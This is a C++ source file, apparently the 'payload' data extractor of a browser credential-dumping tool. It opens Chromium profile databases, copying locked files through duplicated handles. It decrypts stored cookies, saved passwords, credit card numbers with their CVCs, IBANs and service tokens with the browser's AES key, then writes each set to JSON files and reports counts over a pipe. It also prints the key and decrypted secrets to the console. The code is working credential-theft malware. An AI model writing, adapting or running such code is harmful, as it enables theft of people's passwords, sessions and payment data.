// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "data_extractor.hpp"
#include "handle_duplicator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <fstream>
#include <sstream>
#include <iomanip>
#include <map>
#include <iostream>

namespace Payload {

    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase)
        : m_pipe(pipe), m_key(key), m_outputBase(outputBase) {
        std::cout << "[src/payload/data_extractor] [+] key : ";

        for (const auto& b : key)
        {
            std::cout << std::hex
                << std::setw(2)
                << std::setfill('0')
                << static_cast<int>(b);
        }

        std::cout << std::dec << '\n';
    }

    sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
        sqlite3* db = nullptr;
        if (sqlite3_open_v2(dbPath.string().c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
            if (db) sqlite3_close(db);
            return nullptr;
        }
        return db;
    }

    sqlite3* DataExtractor::OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath) {
        sqlite3* db = OpenDatabase(dbPath);
        if (db) return db;

        try {
            HandleDuplicator duplicator;
            auto tempFile = duplicator.CopyLockedFile(dbPath, std::filesystem::temp_directory_path());
            if (!tempFile) return nullptr;
            m_tempFiles.push_back(*tempFile);
            return OpenDatabase(*tempFile);
        }
        catch (const std::exception&) {
            return nullptr;
        }
    }

    void DataExtractor::CleanupTempFiles() {
        for (auto& t : m_tempFiles) {
            try { std::filesystem::remove(t); }
            catch (...) {}
        }
        m_tempFiles.clear();
    }

    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {

        auto cookiePath = profilePath / "Network" / "Cookies";
        if (std::filesystem::exists(cookiePath)) {
            sqlite3* db = OpenDatabaseWithHandleDuplication(cookiePath);
            if (db) {
                ExtractCookies(db, m_outputBase / browserName / profilePath.filename() / "cookies.json");
                sqlite3_close(db);
            }
        }

        auto loginPath = profilePath / "Login Data";
        if (std::filesystem::exists(loginPath)) {
            sqlite3* db = OpenDatabaseWithHandleDuplication(loginPath);
            if (db) {
                ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords.json");
                sqlite3_close(db);
            }
        }

        auto loginAccountPath = profilePath / "Login Data For Account";
        if (std::filesystem::exists(loginAccountPath)) {
            sqlite3* db = OpenDatabaseWithHandleDuplication(loginAccountPath);
            if (db) {
                ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords_account.json");
                sqlite3_close(db);
            }
        }

        auto webDataPath = profilePath / "Web Data";
        if (std::filesystem::exists(webDataPath)) {
            sqlite3* db = OpenDatabaseWithHandleDuplication(webDataPath);
            if (db) {
                ExtractCards(db, m_outputBase / browserName / profilePath.filename() / "cards.json");
                ExtractIBANs(db, m_outputBase / browserName / profilePath.filename() / "ibans.json");
                ExtractTokens(db, m_outputBase / browserName / profilePath.filename() / "tokens.json");
                sqlite3_close(db);
            }
        }

        CleanupTempFiles();
    }

    // ====================== EXTRACTION FUNCTIONS ======================
    void DataExtractor::ExtractCookies(sqlite3* db,
        const std::filesystem::path& outFile)
    {
        sqlite3_stmt* stmt = nullptr;

        const char* query =
            "SELECT host_key, name, path, is_secure, "
            "is_httponly, expires_utc, encrypted_value "
            "FROM cookies";

        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK)
            return;

        std::vector<std::string> entries;

        while (sqlite3_step(stmt) == SQLITE_ROW)
        {
            const void* blob = sqlite3_column_blob(stmt, 6);
            int blobLen = sqlite3_column_bytes(stmt, 6);

            if (!blob || blobLen <= 0)
                continue;

            std::vector<uint8_t> encrypted(
                static_cast<const uint8_t*>(blob),
                static_cast<const uint8_t*>(blob) + blobLen);

            auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);

            std::cout << "[src/payload/data_extractor] [+] m_key : ";

            for (const auto& b : m_key)
            {
                std::cout << std::hex
                    << std::setw(2)
                    << std::setfill('0')
                    << static_cast<int>(b);
            }

            std::cout << std::dec << '\n';

            if (decrypted && !decrypted->empty())
            {
                std::string value;

                if (decrypted->size() > 32)
                {
                    value = std::string(
                        reinterpret_cast<char*>(decrypted->data()) + 32,
                        decrypted->size() - 32);
                }
                else
                {
                    value = std::string(
                        reinterpret_cast<char*>(decrypted->data()),
                        decrypted->size());
                }

                std::stringstream ss;

                ss << "{\"host\":\""
                    << EscapeJson(
                        reinterpret_cast<const char*>(
                            sqlite3_column_text(stmt, 0)))
                    << "\","
                    << "\"name\":\""
                    << EscapeJson(
                        reinterpret_cast<const char*>(
                            sqlite3_column_text(stmt, 1)))
                    << "\","
                    << "\"path\":\""
                    << EscapeJson(
                        reinterpret_cast<const char*>(
                            sqlite3_column_text(stmt, 2)))
                    << "\","
                    << "\"is_secure\":"
                    << (sqlite3_column_int(stmt, 3) ? "true" : "false")
                    << ","
                    << "\"is_httponly\":"
                    << (sqlite3_column_int(stmt, 4) ? "true" : "false")
                    << ","
                    << "\"expires\":"
                    << sqlite3_column_int64(stmt, 5)
                    << ","
                    << "\"value\":\""
                    << EscapeJson(value)
                    << "\"}";

                entries.push_back(ss.str());
            }
        }

        sqlite3_finalize(stmt);

        if (!entries.empty())
        {
            std::filesystem::create_directories(outFile.parent_path());

            std::ofstream out(outFile);

            out << "[\n";

            for (size_t i = 0; i < entries.size(); ++i)
            {
                out << entries[i]
                    << (i < entries.size() - 1 ? ",\n" : "\n");
            }

            out << "]";

            m_pipe.Log("COOKIES:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt = nullptr;
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";

        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 2);
            int         blobLen = sqlite3_column_bytes(stmt, 2);

            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);

                std::cout << "[src/payload/data_extractor] [+] decrypted : ";

                if (decrypted)
                {
                    for (const auto& b : *decrypted)
                    {
                        std::cout << std::hex
                            << std::setw(2)
                            << std::setfill('0')
                            << static_cast<int>(b);
                    }
                }
                else
                {
                    std::cout << "<decryption failed>";
                }

                std::cout << std::dec << '\n';

                if (decrypted) {
                    std::string pass((char*)decrypted->data(), decrypted->size());
                    std::stringstream ss;
                    ss << "{\"url\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                        << "\"user\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                        << "\"pass\":\"" << EscapeJson(pass) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i)
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("PASSWORDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractCards(sqlite3* db, const std::filesystem::path& outFile) {
        // Load CVCs
        std::map<std::string, std::string> cvcMap;
        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* guid = (const char*)sqlite3_column_text(stmt, 0);
                const void* blob = sqlite3_column_blob(stmt, 1);
                int         len = sqlite3_column_bytes(stmt, 1);
                if (guid && blob && len > 0) {
                    std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                    auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                    if (dec) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                }
            }
            sqlite3_finalize(stmt);
        }

        // Extract cards
        const char* query = "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* guid = (const char*)sqlite3_column_text(stmt, 0);
            const void* blob = sqlite3_column_blob(stmt, 4);
            int         len = sqlite3_column_bytes(stmt, 4);

            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string number((char*)dec->data(), dec->size());
                    std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "";

                    std::stringstream ss;
                    ss << "{\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                        << "\"month\":" << sqlite3_column_int(stmt, 2) << ","
                        << "\"year\":" << sqlite3_column_int(stmt, 3) << ","
                        << "\"number\":\"" << EscapeJson(number) << "\","
                        << "\"cvc\":\"" << EscapeJson(cvc) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i)
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("CARDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db, "SELECT value_encrypted, nickname FROM local_ibans", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 0);
            int         len = sqlite3_column_bytes(stmt, 0);

            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string iban((char*)dec->data(), dec->size());
                    std::stringstream ss;
                    ss << "{\"nickname\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                        << "\"iban\":\"" << EscapeJson(iban) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i)
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("IBANS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractTokens(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt = nullptr;
        bool hasBindingKey = true;

        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token, binding_key FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) {
            hasBindingKey = false;
            if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) return;
        }

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 1);
            int         len = sqlite3_column_bytes(stmt, 1);

            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string token((char*)dec->data(), dec->size());
                    std::string bindingKey;

                    if (hasBindingKey) {
                        const void* bKeyBlob = sqlite3_column_blob(stmt, 2);
                        int         bKeyLen = sqlite3_column_bytes(stmt, 2);
                        if (bKeyBlob && bKeyLen > 0) {
                            std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
                            auto decKey = Crypto::AesGcm::Decrypt(m_key, encKey);

                            std::cout << "[src/payload/data_extractor] [+] decKey : ";

                            if (decKey)
                            {
                                // Print as text
                                std::string keyText(
                                    reinterpret_cast<const char*>(decKey->data()),
                                    decKey->size());

                                std::cout << keyText << '\n';

                                bindingKey = keyText;
                            }
                            else
                            {
                                std::cout << "<decryption failed>\n";
                            }
                        }
                    }

                    std::stringstream ss;
                    ss << "{\"service\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                        << "\"token\":\"" << EscapeJson(token) << "\","
                        << "\"binding_key\":\"" << EscapeJson(bindingKey) << "\"}";
                    std::cout << "[src/payload/data_extractor] [+] binding_key  : " << bindingKey << "\n";

                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i)
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
        }
    }

    std::string DataExtractor::EscapeJson(const std::string& s) {
        std::ostringstream o;
        for (char c : s) {
            if (c == '"')  o << "\\\"";
            else if (c == '\\') o << "\\\\";
            else if (c == '\b') o << "\\b";
            else if (c == '\f') o << "\\f";
            else if (c == '\n') o << "\\n";
            else if (c == '\r') o << "\\r";
            else if (c == '\t') o << "\\t";
            else if ('\x00' <= c && c <= '\x1f')
                o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else o << c;
        }
        return o.str();
    }

} // namespace Payload